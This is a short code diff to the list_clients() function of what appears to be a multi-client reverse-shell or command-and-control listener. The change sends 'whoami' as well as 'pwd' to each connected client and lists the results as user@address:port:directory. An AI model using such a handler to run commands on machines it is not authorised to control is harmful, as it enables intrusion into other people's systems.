@@ -105,6 +105,9 @@ def list_clients():
             cwd = None
             client.send(str.encode('pwd'))
             cwd = client.recv(201480).decode()
+            client.send(str.encode('whoami'))
+            whoami = client.recv(201480).decode()
+            whoami = whoami.strip()
             if cwd is None:
                 del CURRENT_CONNECTIONS[i]
                 del CURRENT_ADDRESSES[i]
@@ -113,7 +116,7 @@ def list_clients():
             del CURRENT_ADDRESSES[i]
             continue
 
-        results += str(i) + " - " + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + " @ " + str(cwd) + "\n"
+        results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
         i+=1
 
     if len(CURRENT_CONNECTIONS) != 0:
